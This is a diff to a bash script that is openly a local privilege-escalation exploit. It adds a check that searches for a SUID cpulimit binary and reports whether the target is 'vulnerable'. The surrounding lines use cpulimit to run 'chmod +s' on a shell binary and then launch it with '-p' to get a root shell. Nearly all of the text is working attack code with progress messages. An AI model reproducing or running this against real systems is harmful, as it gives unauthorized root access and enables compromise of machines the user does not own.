@@ -19,7 +19,29 @@ p2=$(which cpulimit)
 cu1='[+]'
 cu2='[*]'
 cu3='[i]'
+cu4='[x]'
 
+function check(){
+         echo ""
+	       echo -e "$a$cu3$b checking.. $nc"
+	       sleep 3
+         find / -perm -4000 2>/dev/null | grep "cpulimit" > /dev/null 2>&1
+    if [ "$(echo $?)" == "0" ]; then
+	       echo ""
+	       echo -e "$v$cu1$b target is vulnerable $nc"
+	       sleep 4
+    else
+         echo ""
+	       echo -e "$r$cu4$b target no vulnerable $nc"
+	       sleep 4
+	       echo ""
+         tput cnorm
+	       exit 1
+    fi
+}
+
+tput civis
+check
 echo ""
 echo -e "$a$cu3 $b starting exploit.. $nc"
 sleep 4
@@ -32,6 +54,7 @@ sleep 2
 $p2 -l 100 -f chmod +s $p1
 echo -e "$v$cu1 $b getting a shell as root.. $nc"
 sleep 2
+tput cnorm
 $p1 -p
 echo ""
 exit 0
